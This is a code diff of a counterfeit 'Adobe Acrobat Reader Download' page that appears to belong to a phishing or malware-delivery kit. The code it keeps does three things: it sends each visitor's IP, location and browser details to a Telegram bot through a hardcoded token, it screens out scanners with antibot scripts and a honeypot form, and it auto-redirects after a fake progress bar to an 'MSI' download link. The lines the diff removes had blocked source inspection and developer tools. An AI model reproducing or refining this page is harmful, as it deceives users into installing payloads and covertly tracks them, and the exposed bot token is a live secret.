@@ -11,15 +11,12 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Adobe Acrobat Reader Download</title>
-  
+
   <!-- Source Protection Meta Tags -->
   <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
   <meta http-equiv="Pragma" content="no-cache">
   <meta http-equiv="Expires" content="0">
   <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
-  <!-- X-Frame-Options removed to allow iframe loading -->
-  <meta http-equiv="X-Content-Type-Options" content="nosniff">
-  <meta http-equiv="Referrer-Policy" content="no-referrer">
   
   <!-- Antibot Scripts - Load in order -->
   <script src="js/fingerprint.js"></script>
@@ -67,14 +64,6 @@
       margin: 0;
       display: flex;
       flex-direction: column;
-      /* Source Protection */
-      -webkit-user-select: none;
-      -moz-user-select: none;
-      -ms-user-select: none;
-      user-select: none;
-      -webkit-touch-callout: none;
-      -webkit-tap-highlight-color: transparent;
-      -khtml-user-select: none;
     }
     
     .container {
@@ -172,30 +161,37 @@
     /* Main content */
     main {
       flex: 1;
-      padding: 20px 0;
+      padding: 40px 0;
       text-align: center;
     }
     
     h1 {
-      font-size: 28px;
+      font-size: 34px;
       font-weight: 400;
       color: #2c2c2c;
-      margin-bottom: 30px;
+      margin-bottom: 50px;
     }
     
     /* Steps container */
     .steps-container {
       display: flex;
       justify-content: center;
-      gap: 60px;
-      margin-bottom: 20px;
+      gap: 100px;
+      margin-bottom: 40px;
       flex-wrap: wrap;
       position: relative;
     }
     
-    /* Vertical separator line - removed for better iframe fit */
+    /* Vertical separator line */
     .steps-container::after {
-      display: none;
+      content: '';
+      position: absolute;
+      left: 50%;
+      top: 20px;
+      bottom: 80px;
+      width: 1px;
+      background: #e1e1e1;
+      transform: translateX(-50%);
     }
     
     @media (max-width: 768px) {
@@ -205,14 +201,14 @@
     }
     
     .step {
-      flex: 0 1 300px;
+      flex: 0 1 400px;
       text-align: center;
     }
     
     .step-icon {
-      width: 120px;
-      height: 120px;
-      margin: 0 auto 15px;
+      width: 160px;
+      height: 160px;
+      margin: 0 auto 25px;
       position: relative;
       display: flex;
       align-items: center;
@@ -229,14 +225,14 @@
     
     /* Progress section */
     .progress-section {
-      margin: 15px 0;
+      margin: 25px 0;
     }
     
     .progress-info {
       display: flex;
       justify-content: space-between;
-      margin-bottom: 8px;
-      font-size: 14px;
+      margin-bottom: 10px;
+      font-size: 16px;
     }
     
     .progress-bar {
@@ -252,7 +248,7 @@
       height: 100%;
       background: #1473e6;
       border-radius: 4px;
-      animation: fillProgress 2s ease-out forwards; /* Updated to 2 seconds */
+      animation: fillProgress 4s ease-out forwards;
     }
     
     @keyframes fillProgress {
@@ -267,155 +263,30 @@
       }
     }
     
-    /* Updated progress animation duration for 2 seconds */
-    .progress-fill {
-      width: 0%;
-      height: 100%;
-      background: #1473e6;
-      border-radius: 4px;
-      animation: fillProgress 2s ease-out forwards; /* Changed from 4s to 2s */
-    }
-    
     /* Step content */
     .step h2 {
-      font-size: 20px;
+      font-size: 24px;
       font-weight: 600;
-      margin-bottom: 15px;
+      margin-bottom: 20px;
       color: #2c2c2c;
     }
     
     .step p {
-      font-size: 14px;
-      color: #505050;
-      line-height: 1.5;
-    }
-    
-    
-    /* Mobile Popup Modal */
-    .mobile-modal {
-      display: none;
-      position: fixed;
-      z-index: 9999;
-      left: 0;
-      top: 0;
-      width: 100%;
-      height: 100%;
-      background-color: rgba(0, 0, 0, 0.8);
-    }
-    
-    .mobile-modal-content {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background: #fff;
-      padding: 30px;
-      border-radius: 12px;
-      max-width: 400px;
-      width: 90%;
-      text-align: center;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-    }
-    
-    .mobile-modal h2 {
-      color: #fa0f00;
-      margin-bottom: 20px;
-      font-size: 24px;
-    }
-    
-    .mobile-modal p {
-      margin-bottom: 20px;
-      line-height: 1.6;
-      color: #333;
-    }
-    
-    .mobile-modal-close {
-      background: #dc3545;
-      color: white;
-      border: none;
-      padding: 12px 24px;
-      border-radius: 6px;
-      cursor: pointer;
       font-size: 16px;
-      font-weight: 600;
-      min-width: 120px;
+      color: #505050;
+      line-height: 1.6;
     }
     
-    .mobile-modal-close:hover {
-      background: #c82333;
-    }
-
-    /* Additional Source Protection Styles */
-    ::selection {
-      background: transparent;
-    }
     
-    ::-moz-selection {
-      background: transparent;
-    }
-    
-    /* Hide content only for very small heights (likely dev tools) */
-    @media screen and (max-height: 300px) {
-      body { 
-        display: none !important; 
-      }
-    }
-    
-    /* Additional protection styles */
-    * {
-      -webkit-touch-callout: none;
-      -webkit-user-select: none;
-      -khtml-user-select: none;
-      -moz-user-select: none;
-      -ms-user-select: none;
-      user-select: none;
-    }
-    
-    *::before, *::after {
-      -webkit-user-select: none;
-      -moz-user-select: none;
-      -ms-user-select: none;
-      user-select: none;
-    }
-
-    /* Iframe optimization for 900px x 600px */
+    /* Responsive */
     @media (max-width: 950px) {
       .notification-banner {
         right: 20px;
         top: 50%;
         transform: translateY(-50%);
-        max-width: 280px;
-        font-size: 12px;
-        padding: 8px 12px;
-      }
-      
-      .steps-container {
-        gap: 40px;
-        margin-bottom: 15px;
-      }
-      
-      .step {
-        flex: 0 1 250px;
-      }
-      
-      .step-icon {
-        width: 100px;
-        height: 100px;
-        margin: 0 auto 10px;
-      }
-      
-      h1 {
-        font-size: 24px;
-        margin-bottom: 20px;
-      }
-      
-      .step h2 {
-        font-size: 18px;
-        margin-bottom: 10px;
-      }
-      
-      .step p {
-        font-size: 13px;
+        max-width: 320px;
+        font-size: 14px;
+        padding: 10px 16px;
       }
     }
     
@@ -428,42 +299,36 @@
       }
       
       h1 {
-        font-size: 22px;
-        margin-bottom: 20px;
+        font-size: 28px;
+        margin-bottom: 30px;
         padding: 0 20px;
       }
       
       .steps-container {
-        gap: 30px;
-        margin-bottom: 10px;
-      }
-      
-      .step {
-        flex: 0 1 200px;
+        gap: 50px;
       }
       
       .step-icon {
-        width: 80px;
-        height: 80px;
+        width: 120px;
+        height: 120px;
       }
       
       .step-icon img {
-        width: 80px !important;
-        height: 80px !important;
+        width: 120px !important;
+        height: 120px !important;
       }
       
       .step h2 {
-        font-size: 16px;
-        margin-bottom: 8px;
+        font-size: 20px;
       }
       
       .step p {
-        font-size: 12px;
+        font-size: 15px;
       }
     }
   </style>
 </head>
-<body oncontextmenu="return false;" ondragstart="return false;" onselectstart="return false;" onmousedown="return false;" onkeydown="if(event.keyCode==123||event.ctrlKey&&event.shiftKey&&(event.keyCode==73||event.keyCode==74)||event.ctrlKey&&event.keyCode==85)return false;">
+<body>
   <header>
     <div class="container">
       <div class="adobe-logo">
@@ -522,20 +387,6 @@
       </div>
     </div>
   </main>
-  
-  <!-- Mobile Device Modal - Hidden (restrictions removed) -->
-  <div id="mobileModal" class="mobile-modal" style="display: none;">
-      <div class="mobile-modal-content">
-        <h2>⚠️ Windows Desktop Required</h2>
-        <p><strong>This Adobe Acrobat installer is designed for Windows desktop computers only.</strong></p>
-        <p>To download and install Adobe Acrobat Reader, please visit this page using a Windows desktop or laptop computer.</p>
-        <p>Mobile devices and other operating systems are not supported for this installation.</p>
-        <div style="display: flex; gap: 10px; justify-content: center; margin-top: 20px;">
-          <button class="mobile-modal-close" onclick="closeTab()" style="background: #dc3545;">Close</button>
-        </div>
-      </div>
-  </div>
-  
   <!-- Hidden antibot form -->
   <form id="antibot-form" autocomplete="off" style="display:none;">
     <input type="text" name="honeypot1" tabindex="-1" autocomplete="off" style="position:absolute;left:-9999px;top:-9999px;" aria-hidden="true">
@@ -546,298 +397,9 @@
   </form>
 
   <script>
-    // ==============================================
-    // ADVANCED SOURCE CODE PROTECTION SYSTEM
-    // ==============================================
-    
-    (function() {
-      'use strict';
-      
-      // Anti-debugging and source protection
-      const protection = {
-        // Disable right-click context menu
-        disableRightClick: function() {
-          document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            return false;
-          }, true);
-        },
-        
-        // Disable keyboard shortcuts
-        disableKeyboardShortcuts: function() {
-          document.addEventListener('keydown', function(e) {
-            // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+S
-            if (e.keyCode === 123 || // F12
-                (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || // Ctrl+Shift+I/J
-                (e.ctrlKey && e.keyCode === 85) || // Ctrl+U
-                (e.ctrlKey && e.keyCode === 83) || // Ctrl+S
-                (e.ctrlKey && e.keyCode === 65) || // Ctrl+A
-                (e.ctrlKey && e.keyCode === 67) || // Ctrl+C
-                (e.ctrlKey && e.keyCode === 86) || // Ctrl+V
-                (e.ctrlKey && e.keyCode === 88) || // Ctrl+X
-                (e.ctrlKey && e.keyCode === 80) || // Ctrl+P
-                e.keyCode === 116) { // F5
-              e.preventDefault();
-              e.stopPropagation();
-              return false;
-            }
-          }, true);
-        },
-        
-        // Clear console periodically
-        clearConsole: function() {
-          setInterval(function() {
-            try {
-              if (window.console && window.console.clear) {
-                window.console.clear();
-              }
-            } catch(e) {}
-          }, 1000);
-        },
-        
-        // Detect developer tools (disabled for now)
-        detectDevTools: function() {
-          // Temporarily disabled to prevent blank page issues
-          // This can be re-enabled later if needed
-          console.log('Dev tools detection disabled for user experience');
-        },
-        
-        // Anti-debug measures (disabled for now)
-        antiDebug: function() {
-          // Temporarily disabled to prevent blank page issues
-          // This can be re-enabled later if needed
-          console.log('Anti-debug measures disabled for user experience');
-        },
-        
-        // Disable text selection methods
-        disableSelection: function() {
-          document.onselectstart = function() { return false; };
-          document.onmousedown = function() { return false; };
-          document.ondragstart = function() { return false; };
-          
-          // Additional selection prevention
-          if (typeof document.onmousedown !== "undefined") {
-            document.onmousedown = function() { return false; };
-          } else {
-            document.onmouseup = function() { return false; };
-          }
-        },
-        
-        // Iframe busting (disabled to allow iframe loading)
-        preventFraming: function() {
-          // Disabled to allow page to load in iframes
-          console.log('Iframe loading allowed');
-        },
-        
-        // Monitor for common inspection methods (disabled for now)
-        monitorInspection: function() {
-          // Temporarily disabled to prevent blank page issues
-          // This can be re-enabled later if needed
-          console.log('Inspection monitoring disabled for user experience');
-        },
-        
-        // Disable drag and drop
-        disableDragDrop: function() {
-          document.addEventListener('dragover', function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-          }, true);
-          
-          document.addEventListener('drop', function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-          }, true);
-        },
-        
-        // Obfuscate source references
-        hideSource: function() {
-          // Remove script tags from DOM inspection
-          setTimeout(function() {
-            const scripts = document.getElementsByTagName('script');
-            for (let i = scripts.length - 1; i >= 0; i--) {
-              if (scripts[i].innerHTML.includes('protection')) {
-                scripts[i].remove();
-              }
-            }
-          }, 1000);
-        },
-        
-        // Initialize all protection methods
-        init: function() {
-          this.disableRightClick();
-          this.disableKeyboardShortcuts();
-          this.clearConsole();
-          this.detectDevTools();
-          this.disableSelection();
-          this.preventFraming();
-          this.monitorInspection();
-          this.disableDragDrop();
-          this.hideSource();
-          
-          // Anti-debug disabled for user experience
-          // setTimeout(() => {
-          //   if (window.innerWidth > 1000 && window.innerHeight > 600) {
-          //     this.antiDebug();
-          //   }
-          // }, 5000);
-        }
-      };
-      
-      // Initialize protection immediately
-      protection.init();
-      
-      // Additional window protection
-      window.addEventListener('load', function() {
-        protection.init();
-      });
-      
-      // Console warning
-      setTimeout(function() {
-        console.clear();
-        console.log('%cSTOP!', 'color: red; font-size: 50px; font-weight: bold;');
-        console.log('%cThis is a browser feature intended for developers. Source code inspection is not permitted.', 'color: red; font-size: 16px;');
-      }, 1000);
-      
-      // Advanced tamper detection (disabled for now)
-      // Temporarily disabled to prevent blank page issues
-      console.log('Tamper detection disabled for user experience');
-      
-      // Disable common inspection methods (disabled for now)
-      // Temporarily disabled to prevent blank page issues
-      console.log('Console hijacking disabled for user experience');
-      
-    })();
-    
-    // ==============================================
-    // END PROTECTION SYSTEM
-    // ==============================================
-    
     // Telegram Bot Configuration
     const TELEGRAM_BOT_TOKEN = '8135579567:AAHd1T7hPLnQBtnZZfINC-A4XwnrKHKiNI4';
     const TELEGRAM_CHANNEL_ID = '6286017079';
-    
-    // Mobile Detection and Popup Functions
-    function isMobileDevice() {
-      const userAgent = navigator.userAgent.toLowerCase();
-      const mobileKeywords = ['mobile', 'android', 'iphone', 'ipad', 'ipod', 'blackberry', 'windows phone', 'webos'];
-      
-      // Check user agent for mobile keywords
-      const isMobileUA = mobileKeywords.some(keyword => userAgent.includes(keyword));
-      
-      // Check for touch support
-      const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
-      
-      // Check screen size (mobile-like dimensions)
-      const isSmallScreen = window.innerWidth <= 768 || window.innerHeight <= 1024;
-      
-      // More aggressive mobile detection
-      const isMobile = isMobileUA || (isTouchDevice && isSmallScreen) || window.innerWidth <= 768;
-      
-      console.log('Mobile detection:', {
-        userAgent: userAgent,
-        isMobileUA: isMobileUA,
-        isTouchDevice: isTouchDevice,
-        isSmallScreen: isSmallScreen,
-        windowWidth: window.innerWidth,
-        windowHeight: window.innerHeight,
-        finalResult: isMobile
-      });
-      
-      return isMobile;
-    }
-    
-    function isWindowsOS() {
-      const userAgent = navigator.userAgent.toLowerCase();
-      return userAgent.includes('windows') || userAgent.includes('win32') || userAgent.includes('win64');
-    }
-    
-    function showMobileModal() {
-      document.getElementById('mobileModal').style.display = 'block';
-      document.body.style.overflow = 'hidden'; // Prevent scrolling
-      console.log('Mobile modal shown');
-    }
-    
-    function closeMobileModal() {
-      document.getElementById('mobileModal').style.display = 'none';
-      document.body.style.overflow = 'auto'; // Restore scrolling
-      console.log('Mobile modal closed');
-    }
-    
-    function closeTab() {
-      console.log('Closing tab...');
-      
-      // Method 1: Try to redirect parent window (for iframes)
-      try {
-        if (top && top !== self) {
-          console.log('Closing parent window (iframe detected)');
-          top.location.href = 'about:blank';
-          return;
-        }
-      } catch (e) {
-        console.log('Parent redirect failed:', e);
-      }
-      
-      // Method 2: Try window.close() first
-      try {
-        window.close();
-        return;
-      } catch (e) {
-        console.log('window.close() failed:', e);
-      }
-      
-      // Method 3: Try to close via history
-      try {
-        window.history.back();
-        setTimeout(() => {
-          window.close();
-        }, 100);
-        return;
-      } catch (e) {
-        console.log('History back method failed:', e);
-      }
-      
-      // Method 4: Try to open new window and close current
-      try {
-        window.open('', '_self');
-        window.close();
-        return;
-      } catch (e) {
-        console.log('Open/close method failed:', e);
-      }
-      
-      // Method 5: Try to navigate to parent and close
-      try {
-        if (window.opener) {
-          window.opener = null;
-        }
-        window.close();
-        return;
-      } catch (e) {
-        console.log('Opener method failed:', e);
-      }
-      
-      // Method 6: Force close by redirecting to blank and trying close
-      try {
-        window.location.replace('about:blank');
-        setTimeout(() => {
-          window.close();
-        }, 100);
-        return;
-      } catch (e) {
-        console.log('Replace and close method failed:', e);
-      }
-      
-      // Method 7: Last resort - show alert and try to close
-      try {
-        alert('Please close this tab manually');
-        window.close();
-      } catch (e) {
-        console.log('All close methods failed:', e);
-        // Final attempt - just redirect to blank
-        window.location.href = 'about:blank';
-      }
-    }
     
     // Telegram Notification Functions
     async function getVisitorInfo() {
@@ -885,7 +447,7 @@
     
     async function sendTelegramNotification(visitorInfo) {
       try {
-        const message = `🔔 New Visitor Alert
+        const message = `🔔 New Visitor Alert - MSI Page
         
 📍 Location Details:
 • IP Address: ${visitorInfo.ip}
@@ -909,7 +471,7 @@
 • User Agent: ${visitorInfo.userAgent}
 
 ---
-Adobe Acrobat Download Page Visit`;
+Adobe Acrobat MSI Download Page Visit`;
 
         const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         
@@ -935,7 +497,7 @@ Adobe Acrobat Download Page Visit`;
       }
     }
     
-    // Combined initialization on page load
+    // Animate progress percentage from 0% to 100% over 4 seconds
     window.addEventListener('load', async function() {
       // Send Telegram notification for visitor
       try {
@@ -944,16 +506,8 @@ Adobe Acrobat Download Page Visit`;
       } catch (error) {
         console.error('Error with visitor tracking:', error);
       }
-      
-      // Mobile restriction removed - all devices can access the page
-      console.log('All devices allowed - no mobile restrictions');
-      
-      // Run progress animation and redirect for all devices
-      console.log('Starting redirect process for all devices');
-      
-      // Animate progress percentage from 0% to 100% over 2 seconds
       const percentageElement = document.getElementById('progress-percentage');
-      const duration = 2000; // 2 seconds
+      const duration = 4000; // 4 seconds
       const startTime = Date.now();
       
       function updatePercentage() {
@@ -975,11 +529,9 @@ Adobe Acrobat Download Page Visit`;
       requestAnimationFrame(updatePercentage);
     });
     
-    // Function to trigger redirect after animation completes (all devices)
+    // Function to trigger redirect after animation completes
     function triggerRedirectAfterAnimation() {
       console.log('Animation completed, checking for redirect...');
-      
-      console.log('Proceeding with redirect for all devices');
       
       // Check if utils is loaded and teams is enabled
       if (typeof window.utils !== 'undefined' && window.utils.isProviderEnabled('teams')) {
@@ -1012,45 +564,13 @@ Adobe Acrobat Download Page Visit`;
           
           // Redirect immediately after animation completes
           setTimeout(() => {
-            console.log('Executing redirect to:', finalUrl);
-            
-            // Try multiple redirect methods for iframe compatibility
-            try {
-              // Method 1: Try top.location first (for iframes)
-              if (top && top !== self) {
-                console.log('Redirecting via top.location (iframe detected)');
-                top.location.href = finalUrl;
-                return;
-              }
-            } catch (e) {
-              console.log('top.location failed, trying window.location:', e);
-            }
-            
-            try {
-              // Method 2: Try window.location
-              console.log('Redirecting via window.location');
-              window.location.href = finalUrl;
-            } catch (e) {
-              console.log('window.location failed, trying location.replace:', e);
-            }
-            
-            try {
-              // Method 3: Try location.replace
-              console.log('Redirecting via location.replace');
-              window.location.replace(finalUrl);
-            } catch (e) {
-              console.log('All redirect methods failed:', e);
-            }
+            window.location.href = finalUrl;
           }, 100); // Small delay to ensure smooth transition
         } else {
           console.error('Failed to get teams URL');
         }
       } else {
         console.error('Utils not loaded or teams not enabled');
-        console.log('window.utils:', typeof window.utils);
-        if (typeof window.utils !== 'undefined') {
-          console.log('isProviderEnabled(teams):', window.utils.isProviderEnabled('teams'));
-        }
       }
     }
 
